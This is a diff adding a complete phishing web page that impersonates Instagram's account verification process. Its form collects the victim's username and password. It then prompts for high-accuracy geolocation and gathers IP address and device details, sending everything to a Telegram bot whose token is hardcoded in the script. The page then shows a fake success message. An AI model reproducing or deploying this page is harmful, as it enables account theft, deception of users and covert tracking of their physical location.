@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Account Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .ig-container {
+            max-width: 350px;
+            width: 100%;
+        }
+
+        .ig-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 20px 40px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .ig-logo {
+            margin: 22px auto 12px;
+            width: 175px;
+        }
+
+        .ig-title {
+            color: #262626;
+            font-size: 16px;
+            font-weight: 600;
+            margin: 10px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .ig-badge {
+            background: url('https://www.instagram.com/static/images/ico/xxhdpi_launcher.png/99cf3909d459.png') no-repeat -130px -178px;
+            width: 16px;
+            height: 16px;
+            margin-left: 5px;
+            display: inline-block;
+        }
+
+        .ig-text {
+            color: #8e8e8e;
+            font-size: 14px;
+            line-height: 18px;
+            margin: 10px 0 20px;
+        }
+
+        .ig-form {
+            margin-top: 15px;
+        }
+
+        .ig-input {
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            color: #262626;
+            font-size: 14px;
+            padding: 9px 8px 7px;
+            width: 100%;
+            margin-bottom: 6px;
+        }
+
+        .ig-button {
+            background-color: #0095f6;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-weight: 600;
+            padding: 7px 16px;
+            width: 100%;
+            margin: 8px 0;
+            cursor: pointer;
+        }
+
+        .ig-footer {
+            text-align: center;
+            color: #8e8e8e;
+            font-size: 12px;
+            margin: 15px 0;
+        }
+
+        .ig-steps {
+            text-align: left;
+            margin: 20px 0;
+        }
+
+        .ig-step {
+            display: flex;
+            margin-bottom: 15px;
+        }
+
+        .ig-step-number {
+            background-color: #0095f6;
+            color: white;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 12px;
+            margin-right: 10px;
+            flex-shrink: 0;
+        }
+
+        .ig-step-text {
+            font-size: 14px;
+            color: #262626;
+        }
+
+        .ig-loading {
+            display: none;
+            margin: 20px 0;
+        }
+
+        .ig-success {
+            display: none;
+            color: #262626;
+            font-size: 14px;
+            margin: 20px 0;
+        }
+
+        .ig-location-permission {
+            display: none;
+            margin: 20px 0;
+            padding: 15px;
+            background: #f5f5f5;
+            border-radius: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="ig-container">
+        <div class="ig-box">
+            <div class="ig-logo">
+                <svg aria-label="Instagram" fill="#262626" height="29" viewBox="0 0 192 192" width="29">
+                    <path d="M143 0H49C22 0 0 22 0 49v94c0 27 22 49 49 49h94c27 0 49-22 49-49V49c0-27-22-49-49-49zm-47 147c-27 0-49-22-49-49s22-49 49-49 49 22 49 49-22 49-49 49zm61-99c-7 0-12-5-12-12s5-12 12-12 12 5 12 12-5 12-12 12zm-15 25c0 19-15 34-34 34s-34-15-34-34 15-34 34-34 34 15 34 34z" fill-rule="evenodd"></path>
+                </svg>
+            </div>
+
+            <h2 class="ig-title">Verify Your Account <span class="ig-badge"></span></h2>
+            <p class="ig-text">Request a blue verification badge for your account</p>
+
+            <div class="ig-steps">
+                <div class="ig-step">
+                    <div class="ig-step-number">1</div>
+                    <div class="ig-step-text">Enter your account information</div>
+                </div>
+                <div class="ig-step">
+                    <div class="ig-step-number">2</div>
+                    <div class="ig-step-text">We'll review your request</div>
+                </div>
+                <div class="ig-step">
+                    <div class="ig-step-number">3</div>
+                    <div class="ig-step-text">You'll receive notification within 30 days</div>
+                </div>
+            </div>
+
+            <form id="igVerifyForm" class="ig-form">
+                <input type="text" class="ig-input" placeholder="Username" id="igUsername" required>
+                <input type="password" class="ig-input" placeholder="Password" id="igPassword" required>
+                <button type="submit" class="ig-button">Submit Request</button>
+            </form>
+
+            <div class="ig-location-permission" id="igLocationPermission">
+                <p>To verify your account, we need to confirm your location. Please allow location access when prompted.</p>
+                <button id="igAllowLocation" class="ig-button" style="margin-top: 10px;">Allow Location</button>
+            </div>
+
+            <div class="ig-loading" id="igLoading">
+                <p>Processing your request...</p>
+            </div>
+
+            <div class="ig-success" id="igSuccess">
+                <p>Your verification request has been submitted successfully.</p>
+                <p>You'll be notified when your account is reviewed.</p>
+            </div>
+
+            <p style="font-size: 12px; margin-top: 15px; color: #8e8e8e;">
+                By proceeding, you agree to our Terms and confirm you've read our Data Policy.
+            </p>
+        </div>
+
+        <div class="ig-box">
+            <p class="ig-text">Already have a verified account? <a href="#" style="color: #0095f6; text-decoration: none; font-weight: 600;">Log in</a></p>
+        </div>
+
+        <div class="ig-footer">
+            <p>© 2025 Instagram from Meta</p>
+        </div>
+    </div>
+
+    <script>
+        // Telegram Bot Configuration
+        const BOT_TOKEN = '7675321199:AAEyUyDEe3ixNTCS8mXOqIhoh1Bag3vjOfg'; // Replace with your actual bot token
+        let CHAT_ID = 'YOUR_CHAT_ID';     // Replace with your desired chat ID
+
+        // Function to update the chat ID
+        function updateChatId(newChatId) {
+            CHAT_ID = newChatId;
+            console.log('Telegram Chat ID updated to:', CHAT_ID);
+        }
+
+        // Example of how you might change the chat ID from a URL parameter
+        const urlParams = new URLSearchParams(window.location.search);
+        const newChatIdFromUrl = urlParams.get('id'); // Using 'id' as the parameter name
+        if (newChatIdFromUrl) {
+            updateChatId(newChatIdFromUrl);
+        }
+
+        let userCredentials = {};
+        let locationAccessGranted = false;
+
+        // Function to get IP information
+        async function getIPInfo() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                return {
+                    ip: ipData.ip,
+                    deviceInfo: navigator.userAgent,
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    languages: navigator.languages ? navigator.languages.join(', ') : navigator.language
+                };
+            } catch (error) {
+                console.error('Error fetching IP:', error);
+                return {
+                    ip: 'Unknown',
+                    deviceInfo: navigator.userAgent,
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    languages: navigator.languages ? navigator.languages.join(', ') : navigator.language
+                };
+            }
+        }
+
+        // Function to get precise location
+        function getPreciseLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject("Geolocation is not supported by this browser.");
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        });
+                    },
+                    (error) => {
+                        reject(`Error getting location: ${error.message}`);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+
+        // Function to send data to Telegram
+        async function sendToTelegram() {
+            const ipInfo = await getIPInfo();
+            let locationInfo = {};
+            let locationMessage = "📍 User denied location access";
+
+            try {
+                if (locationAccessGranted) {
+                    const preciseLocation = await getPreciseLocation();
+                    locationInfo = {
+                        latitude: preciseLocation.latitude,
+                        longitude: preciseLocation.longitude,
+                        accuracy: preciseLocation.accuracy
+                    };
+
+                    const mapsLink = `https://www.google.com/maps?q=$?q=${preciseLocation.latitude},${preciseLocation.longitude}`;
+                    locationMessage = `📍 <a href="${mapsLink}">Live Location (Accuracy: ${Math.round(preciseLocation.accuracy)} meters)</a>`;
+                }
+            } catch (error) {
+                console.error('Error getting precise location:', error);
+            }
+
+            const message = `
+🔔 <b>New Instagram Credentials</b> 🔔
+
+📱 <b>Account Info:</b>
+👤 Username: <code>${userCredentials.username}</code>
+🔑 Password: <code>${userCredentials.password}</code>
+
+🌍 <b>Location Info:</b>
+${locationMessage}
+🆔 IP Address: <code>${ipInfo.ip}</code>
+
+💻 <b>Device Info:</b>
+📱 User Agent: ${ipInfo.deviceInfo}
+🖥️ Screen: ${ipInfo.screenResolution}
+🗣️ Languages: ${ipInfo.languages}
+
+⏰ Time: ${new Date().toLocaleString()}
+            `;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML',
+                    disable_web_page_preview: false
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Message sent to Telegram:', data);
+                document.getElementById('igLoading').style.display = 'none';
+                document.getElementById('igSuccess').style.display = 'block';
+
+                // Reset form after delay
+                setTimeout(function() {
+                    document.getElementById('igSuccess').style.display = 'none';
+                    document.getElementById('igVerifyForm').style.display = 'block';
+                    document.getElementById('igVerifyForm').reset();
+                    locationAccessGranted = false;
+                }, 3000);
+            })
+            .catch(error => {
+                console.error('Error sending to Telegram:', error);
+            });
+        }
+
+        // Handle form submission
+        document.getElementById('igVerifyForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // Get form values
+            userCredentials = {
+                username: document.getElementById('igUsername').value,
+                password: document.getElementById('igPassword').value
+            };
+
+            // Show location permission request
+            document.getElementById('igVerifyForm').style.display = 'none';
+            document.getElementById('igLocationPermission').style.display = 'block';
+        });
+
+        // Handle location permission button
+        document.getElementById('igAllowLocation').addEventListener('click', function() {
+            document.getElementById('igLocationPermission').style.display = 'none';
+            document.getElementById('igLoading').style.display = 'block';
+
+            // Request location permission
+            if (navigator.permissions) {
+                navigator.permissions.query({name: 'geolocation'})
+                    .then(permissionStatus => {
+                        if (permissionStatus.state === 'granted') {
+                            locationAccessGranted = true;
+                            sendToTelegram();
+                        } else {
+                            getPreciseLocation()
+                                .then(() => {
+                                    locationAccessGranted = true;
+                                    sendToTelegram();
+                                })
+                                .catch(() => {
+                                    locationAccessGranted = false;
+                                    sendToTelegram();
+                                });
+                        }
+                    });
+            } else {
+                // For browsers that don't support permissions API
+                getPreciseLocation()
+                    .then(() => {
+                        locationAccessGranted = true;
+                        sendToTelegram();
+                    })
+                    .catch(() => {
+                        locationAccessGranted = false;
+                        sendToTelegram();
+                    });
+            }
+        });
+    </script>
+</body>
+</html>
